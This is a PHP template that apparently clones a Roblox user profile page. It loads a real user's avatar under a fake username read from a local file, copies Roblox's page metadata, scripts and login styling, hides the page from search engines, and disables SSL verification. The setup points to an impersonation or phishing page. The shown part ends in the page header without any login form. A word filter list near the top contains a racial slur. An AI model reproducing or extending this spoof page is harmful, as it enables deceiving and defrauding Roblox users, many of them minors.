<?php
$rusername = htmlspecialchars(file_get_contents('controller/realusername.txt'));
$fusername = htmlspecialchars(file_get_contents('controller/fakeusername.txt'));
$aboutme = htmlspecialchars(file_get_contents('controller/aboutme.txt'));
$json = json_decode(file_get_contents("https://api.newstargeted.com/roblox/users/v2/user.php?username=$rusername"));
$userid = $json->userId;
$payload = '[{"requestId":"'."".$userid."".'::Avatar:352x352:png:regular","type":"Avatar","targetId":'."".$userid."".',"token":"","format":"png","size":"352x352"}]';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://thumbnails.roblox.com/v1/batch");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
$headers = ["content-type: application/json", "x-csrf-token: "];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$output = curl_exec($ch);
$thumbnail = str_replace('"}]}','',ltrim(strstr($output, '"imageUrl":"'), '"imageUrl":"'));
function requestCollections($userid)
{
    $getCollections = file_get_contents("https://www.roblox.com/users/profile/robloxcollections-json?userId=$userid");
    $CollectionDecode = json_decode($getCollections, true);
    $i = "0";
    if (strpos($getCollections, 'CollectionsItems') !== false) {
        $CollectionData = $CollectionDecode["CollectionsItems"];
        foreach ($CollectionData as $CollectionValue) {
            echo '<li class="list-item asset-item collections-item ng-scope" ng-repeat="item in collections"><a ng-href="'."".$CollectionValue["AssetSeoUrl"]."".'" class="collections-link" title="'."".$CollectionValue["Name"]."".'" href="'."".$CollectionValue["AssetSeoUrl"]."".'"><div class="img-container"><img class="asset-thumb-container ng-isolate-scope" lazy-img="'."".$CollectionValue["Thumbnail"]["Url"]."".'" thumbnail="item.Thumbnail" reset-src="true" image-retry="" src="'."".$CollectionValue["Thumbnail"]["Url"]."".'"><div class="asset-restriction-icon"><span ng-show="item.AssetRestrictionIcon&amp;&amp;item.AssetRestrictionIcon.CssTag" class="icon-'."".$CollectionValue["AssetRestrictionIcon"]["CssTag"]."".'-label icon-label" ng-class="+item.AssetRestrictionIcon.CssTag+"></span></div></div><span class="font-header-2 text-overflow item-name"><!-- ngIf: item.HasPremiumBenefit --> <span ng-bind="item.Name" class="ng-binding">'."".$CollectionValue["Name"]."".'</span></span></a></li>';
            $i++;
            if($i == 6) break;
    }
    } else {
        return "";
    }
    return;
}

$word = array('Fuck', 'Ass', 'Bitch', 'Nigga', 'Scam', 'fuck', 'ass', 'bitch', 'nigga', 'scam');
$activity = file_get_contents('controller/activity.txt');
?>


<!DOCTYPE html>
<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
<!--[if gt IE 8]><!-->
<html><!--<![endif]--><head data-machine-id="CHI2-WEB644"><style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style><style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <!-- MachineID: CHI2-WEB644 -->
    <title><?=$fusername?> - Roblox</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Roblox Corporation">
<meta name="description" content="<?=$fusername?> is one of the millions creating and exploring the endless possibilities of Roblox. Join <?=$fusername?> on Roblox and explore together!<?=$aboutme?>">
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">

    <meta name="apple-itunes-app" content="app-id=431946152">


    <meta id="RobotsMeta" name="robots" content="noindex, nofollow">


<script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script><script ec-api-script="true" type="text/javascript" async="" src="https://roblox-api.arkoselabs.com/cdn/fc/js/34623ec09800ed1ff9bcf89539b4dd9450ff7d31/standard/funcaptcha_api.js"></script><script ec-api-script="true" type="text/javascript" async="" src="https://roblox-api.arkoselabs.com/cdn/fc/js/34623ec09800ed1ff9bcf89539b4dd9450ff7d31/standard/funcaptcha_api.js"></script><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script type="application/ld+json">
    {
    "@context" : "http://schema.org",
    "@type" : "Organization",
    "name" : "Roblox",
    "url" : "https://www.roblox.com/",
    "logo": "https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91",
    "sameAs" : [
    "https://www.facebook.com/roblox/",
    "https://twitter.com/roblox",
    "https://www.linkedin.com/company/147977",
    "https://www.instagram.com/roblox/",
    "https://www.youtube.com/user/roblox",
    "https://plus.google.com/+roblox",
    "https://www.twitch.tv/roblox"
    ]
    }
</script>    <meta property="og:site_name" content="Roblox">
    <meta property="og:title" content="<?=$fusername?>'s Profile">
    <meta property="og:type" content="profile">
        <meta property="og:url" content="https://www.roblox.com/users/156/profile">
    <meta property="og:description" content="<?=$fusername?> is one of the millions creating and exploring the endless possibilities of Roblox. Join <?=$fusername?> on Roblox and explore together!<?=$aboutme?>">
            <meta property="og:image" content="<?=$thumbnail?>">
    <meta property="fb:app_id" content="190191627665278">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@Roblox">
    <meta name="twitter:title" content="<?=$fusername?>'s Profile">
    <meta name="twitter:description" content="<?=$fusername?> is one of the millions creating and exploring the endless possibilities of Roblox. Join <?=$fusername?> on Roblox and explore together!<?=$aboutme?>">
    <meta name="twitter:creator">
            <meta name="twitter:image1" content="<?=$thumbnail?>">
    <meta name="twitter:app:country" content="US">
    <meta name="twitter:app:name:iphone" content="Roblox Mobile">
    <meta name="twitter:app:id:iphone" content="431946152">
    <meta name="twitter:app:url:iphone">
    <meta name="twitter:app:name:ipad" content="Roblox Mobile">
    <meta name="twitter:app:id:ipad" content="431946152">
    <meta name="twitter:app:url:ipad">
    <meta name="twitter:app:name:googleplay" content="Roblox">
    <meta name="twitter:app:id:googleplay" content="com.roblox.client">
    <meta name="twitter:app:url:googleplay">

    <meta ng-csp="no-unsafe-eval">

<meta name="locale-data" data-language-code="en_us" data-language-name="English"><meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown">
<meta name="environment-meta" data-is-testing-site="false">

<meta id="roblox-display-names" data-enabled="true"><meta name="page-meta" data-internal-page-name="Profile">
    

<script type="text/javascript">
    var Roblox = Roblox || {};

    Roblox.BundleVerifierConstants = {
        isMetricsApiEnabled: true,
        eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
        deviceType: "Computer",
        cdnLoggingEnabled: JSON.parse("true")
    };
</script>        <script type="text/javascript">
            var Roblox = Roblox || {};

Roblox.BundleDetector = (function () {
    var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;

    var loadStates = {
        loadSuccess: "loadSuccess",
        loadFailure: "loadFailure",
        executionFailure: "executionFailure"
    };

    var bundleContentTypes = {
        javascript: "javascript",
        css: "css"
    };

    var ephemeralCounterNames = {
        cdnPrefix: "CDNBundleError_",
        unknown: "CDNBundleError_unknown",
        cssError: "CssBundleError",
        jsError: "JavascriptBundleError",
        jsFileError: "JsFileExecutionError",
        resourceError: "ResourcePerformance_Error",
        resourceLoaded: "ResourcePerformance_Loaded"
    };

    return {
        jsBundlesLoaded: {},
        bundlesReported: {},

        counterNames: ephemeralCounterNames,
        loadStates: loadStates,
        bundleContentTypes: bundleContentTypes,

        timing: undefined,

        setTiming: function (windowTiming) {
            this.timing = windowTiming;
        },

        getLoadTime: function () {
            if (this.timing && this.timing.domComplete) {
                return this.getCurrentTime() - this.timing.domComplete;
            }
        },

        getCurrentTime: function () {
            return new Date().getTime();
        },

        getCdnProviderName: function (bundleUrl, callBack) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', bundleUrl, true);

                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        try {
                            var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
                            if (headerValue) {
                                callBack(headerValue);
                            } else {
                                callBack();
                            }
                        } catch (e) {
                            callBack();
                        }
                    }
                };

                xhr.onerror = function () {
                    callBack();
                };

                xhr.send();
            } else {
                callBack();
            }
        },

        getCdnProviderAndReportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType) {
            this.getCdnProviderName(bundleUrl, function (cdnProviderName) {
                Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
            });
        },

        reportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
            if (!isMetricsApiEnabled
                || !bundleUrl
                || !loadState
                || !loadStates.hasOwnProperty(loadState)
                || !bundleContentType
                || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
                return;
            }

            var xhr = new XMLHttpRequest();
            var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";

            xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.withCredentials = true;
            xhr.send(JSON.stringify({
                bundleUrl: bundleUrl,
                bundleName: bundleName || "",
                bundleContentType: bundleContentType,
                loadState: loadState,
                cdnProviderName: cdnProviderName,
                loadTimeInMilliseconds: this.getLoadTime() || 0
            }));
        },

        logToEphemeralStatistics: function (sequenceName, value) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            sequenceName += "_" + deviceType;

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-stats?name=' + sequenceName + "&value=" + value, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEphemeralCounter: function (ephemeralCounterName) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ephemeralCounterName += "_" + deviceType;
            //log to ephemeral counters - taken from ET.js
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-event?name=' + ephemeralCounterName, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEventStream: function (failedBundle, ctx, cdnProvider, status) {
            var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
                currentPageUrl = encodeURIComponent(window.location.href);

            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ctx += "_" + deviceType;
            //try and grab performance data.
            //Note that this is the performance of the xmlhttprequest rather than the original resource load.
            var duration = 0;
            if (window.performance) {
                var perfTiming = window.performance.getEntriesByName(failedBundle);
                if (perfTiming.length > 0) {
                    var data = perfTiming[0];
                    duration = data.duration || 0;
                }
            }
            //log to event stream (diagnostic)
            var params = "&evt=webBundleError&url=" + currentPageUrl +
                "&ctx=" + ctx + "&fileSourceUrl=" + encodeURIComponent(failedBundle) +
                "&cdnName=" + (cdnProvider || "unknown") +
                "&statusCode=" + (status || "unknown") +
                "&loadDuration=" + Math.floor(duration);
            var img = new Image();
            img.src = esUrl + params;
        },

        getCdnInfo: function (failedBundle, ctx, fileType) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                var counter = this.counterNames;
                xhr.open('GET', failedBundle, true);
                var cdnProvider;

                //succesful request
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
                        if (cdnProvider && cdnProvider.length > 0) {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
                        }
                        else {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                        }
                    }
                    else if (xhr.readyState === xhr.DONE) {
                        // append status to cdn provider so we know its not related to network error. 
                        Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
                    }
                };

                //attach to possible things that can go wrong with the request.
                //additionally a network error will trigger this callback
                xhr.onerror = function () {
                    Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                    Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
                };

                xhr.send();
            }
            else {
                this.logToEventStream(failedBundle, ctx);
            }
        },

        reportResourceError: function (resourceName) {
            var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
            this.logToEphemeralCounter(ephemeralCounterName);
        },

        reportResourceLoaded: function (resourceName) {
            var loadTimeInMs = this.getLoadTime();
            if (loadTimeInMs) {
                var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
                this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
            }
        },

        reportBundleError: function (bundleTag) {
            var ephemeralCounterName, failedBundle, ctx, contentType;
            if (bundleTag.rel && bundleTag.rel === "stylesheet") {
                ephemeralCounterName = this.counterNames.cssError;
                failedBundle = bundleTag.href;
                ctx = "css";
                contentType = bundleContentTypes.css;
            } else {
                ephemeralCounterName = this.counterNames.jsError;
                failedBundle = bundleTag.src;
                ctx = "js";
                contentType = bundleContentTypes.javascript;
            }

            //mark that we logged this bundle
            this.bundlesReported[failedBundle] = true;

            //e.g. javascriptBundleError_Computer
            this.logToEphemeralCounter(ephemeralCounterName);
            //this will also log to event stream
            this.getCdnInfo(failedBundle, ctx, ctx);

            var bundleName;
            if (bundleTag.dataset) {
                bundleName = bundleTag.dataset.bundlename;
            }
            else {
                bundleName = bundleTag.getAttribute('data-bundlename');
            }

            this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
        },

        bundleDetected: function (bundleName) {
            this.jsBundlesLoaded[bundleName] = true;
        },

        verifyBundles: function (document) {
            var ephemeralCounterName = this.counterNames.jsFileError,
                eventContext = ephemeralCounterName;
            //grab all roblox script tags in the page. 
            var scripts = (document && document.scripts) || window.document.scripts;
            var errorsList = [];
            var bundleName;
            var monitor;
            for (var i = 0; i < scripts.length; i++) {
                var item = scripts[i];

                if (item.dataset) {
                    bundleName = item.dataset.bundlename;
                    monitor = item.dataset.monitor;
                }
                else {
                    bundleName = item.getAttribute('data-bundlename');
                    monitor = item.getAttribute('data-monitor');
                }

                if (item.src && monitor && bundleName) {
                    if (!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
                        errorsList.push(item);
                    }
                }
            }
            if (errorsList.length > 0) {
                for (var j = 0; j < errorsList.length; j++) {
                    var script = errorsList[j];
                    if (!this.bundlesReported[script.src]) {
                        //log the counter only if the file is actually corrupted, not just due to failure to load
                        //e.g. JsFileExecutionError_Computer
                        this.logToEphemeralCounter(ephemeralCounterName);
                        this.getCdnInfo(script.src, eventContext, 'js');

                        if (script.dataset) {
                            bundleName = script.dataset.bundlename;
                        }
                        else {
                            bundleName = script.getAttribute('data-bundlename');
                        }

                        this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
                    }
                }
            }
        }
    };
})();

window.addEventListener("load", function (evt) {
    Roblox.BundleDetector.verifyBundles();
});

Roblox.BundleDetector.setTiming(window.performance.timing);
            //# sourceURL=somename.js
        </script>
    
<link href="https://media.discordapp.net/attachments/1167558930193461328/1172232328664326194/200.png?ex=655f916e&is=654d1c6e&hm=5cae69d0d1996eee713f9627e031cc79895b36a6c5b9e8269889a0d9a9cd6971&=&width=269&height=269" rel="icon">


    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/06c44f6c741a9bee45c69e622e59bfe3ae4e7c38bbed9d3b14b4c64f5c121381.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/a006dfa033f2dd134f61312cbcaeafbb61d67d4b2f1774fbbc6b5c346f932458.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/953685b8b086c50ba2a02a85241e8278f5741978daed61ee5665c7cd0e1ccb36.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/6edb2191aa318f963253361b43d2657a04b3d16e9c28fe7b22d4a4d5686f1cb4.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css">


    <link rel="canonical" href="https://www.roblox.com/users/3524148282/profile">
    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch">


    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___b066a927671633deff9d787b4953ac28_m.css/fetch">


<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/0f161e158c689e76fd22cad828c428186a12e276dc4601aaffe5230c3ead905e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PeopleList" data-bundle-source="Main" href="https://css.rbxcdn.com/5b78f24a5404361865e0b4270f7a5f530983e00cb93db4587fd8204050dc3cc7.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Aliases" data-bundle-source="Main" href="https://css.rbxcdn.com/2bf6203effb94dc7909c75c6e890108aa5379f32d538d88eb1533a78cacf322d.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GroupsList" data-bundle-source="Main" href="https://css.rbxcdn.com/105adf87a231522c9bc7de0beae9cc928c074a72def1e694727ac27cd242359e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserDescription" data-bundle-source="Main" href="https://css.rbxcdn.com/192054a85a454151ab8e7e1b0ab68f630347c67d6f0cc0be54c6cd3cd6e5f456.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CurrentWearing" data-bundle-source="Main" href="https://css.rbxcdn.com/cc693776e7662b9afb39b185b252b4f5e8cfb19436bf079b0bc6e2e970112c9d.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ProfileBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/9a71331ed246c4c79ccb18c8582bb1366a2a66843c0776e767b0b48634d36dfa.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ProfileStatistics" data-bundle-source="Main" href="https://css.rbxcdn.com/b52536edd49882b6c7ffbb39e44d25c8f3a96eceb0bf94b4413e6ae9f6e2477b.css">

    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/4fdd2f554b7d7bdd9491b4857be91acb07abfdf5514a73d93ea8f14ce78b6401.css">


    

<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/390eb5d1969a0b33f32893c11b2debd0aba6aa4c356328ffb8cc1976f8e82aea.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/8c7fa7fe640599de1f7fd1278e472f1f2afa5093d7ad4de0f6183c3d8d292d89.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/7fc70d7c74b3742f897833c8ea8a4997dc768f30237a7e0f4ef88c46ed583b76.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Login" data-bundle-source="Main" href="https://css.rbxcdn.com/7fc70d7c74b3742f897833c8ea8a4997dc768f30237a7e0f4ef88c46ed583b76.css">








<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
    Roblox.EnvironmentUrls = {"abtestingApiSite":"https://abtesting.roblox.com","accountInformationApi":"https://accountinformation.roblox.com","accountSettingsApi":"https://accountsettings.roblox.com","adConfigurationApi":"https://adconfiguration.roblox.com","adsApi":"https://ads.roblox.com","apiGatewayCdnUrl":"https://apis.rbxcdn.com","apiGatewayUrl":"https://apis.roblox.com","apiProxyUrl":"https://api.roblox.com","assetDeliveryApi":"https://assetdelivery.roblox.com","authApi":"https://auth.roblox.com","avatarApi":"https://avatar.roblox.com","badgesApi":"https://badges.roblox.com","billingApi":"https://billing.roblox.com","captchaApi":"https://captcha.roblox.com","catalogApi":"https://catalog.roblox.com","chatApi":"https://chat.roblox.com","chatModerationApi":"https://chatmoderation.roblox.com","contactsApi":"https://contacts.roblox.com","contentStoreApi":"https://contentstore.roblox.com","developApi":"https://develop.roblox.com","domain":"roblox.com","economyApi":"https://economy.roblox.com","economycreatorstatsApi":"https://economycreatorstats.roblox.com","engagementPayoutsApi":"https://engagementpayouts.roblox.com","followingsApi":"https://followings.roblox.com","friendsApi":"https://friends.roblox.com","gameInternationalizationApi":"https://gameinternationalization.roblox.com","gamesApi":"https://games.roblox.com","groupsApi":"https://groups.roblox.com","groupsModerationApi":"https://groupsmoderation.roblox.com","helpSite":"http://help.roblox.com","inventoryApi":"https://inventory.roblox.com","itemConfigurationApi":"https://itemconfiguration.roblox.com","localeApi":"https://locale.roblox.com","localizationTablesApi":"https://localizationtables.roblox.com","metricsApi":"https://metrics.roblox.com","midasApi":"https://midas.roblox.com","notificationApi":"https://notifications.roblox.com","premiumFeaturesApi":"https://premiumfeatures.roblox.com","presenceApi":"https://presence.roblox.com","privateMessagesApi":"https://privatemessages.roblox.com","publishApi":"https://publish.roblox.com","restrictedHoursServiceApi":"https://apis.roblox.com/restricted-hours-service","screenTimeApi":"https://apis.rcs.roblox.com/screen-time-api","shareApi":"https://share.roblox.com","thumbnailsApi":"https://thumbnails.roblox.com","tradesApi":"https://trades.roblox.com","translationRolesApi":"https://translationroles.roblox.com","twoStepVerificationApi":"https://twostepverification.roblox.com","universalAppConfigurationApi":"https://apis.roblox.com/universal-app-configuration","userAgreementsServiceApi":"https://apis.roblox.com/user-agreements","userModerationApi":"https://usermoderation.roblox.com","usersApi":"https://users.roblox.com","voiceApi":"https://voice.roblox.com","websiteUrl":"https://www.roblox.com"};

    // please keep the list in alphabetical order
    var additionalUrls = {
        amazonStoreLink: "https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA",
        amazonWebStoreLink: "https%3a%2f%2fwww.amazon.com%2froblox%3f%26_encoding%3dUTF8%26tag%3dr05d13-20%26linkCode%3dur2%26linkId%3d5562fc29c05b45562a86358c198356eb%26camp%3d1789%26creative%3d9325",
        appProtocolUrl: "robloxmobile://",
        appStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
        googlePlayStoreLink: "https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en",
        iosAppStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
        windowsStoreLink: "https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm",
        xboxStoreLink: "https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k"
    }

    for (var urlName in additionalUrls) {
        Roblox.EnvironmentUrls[urlName] = additionalUrls[urlName];
    }
    
</script>



<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.GaEventSettings = {
        gaDFPPreRollEnabled: "false" === "true",
        gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
        gaPerformanceEventEnabled: "false" === "true"
    };
</script>



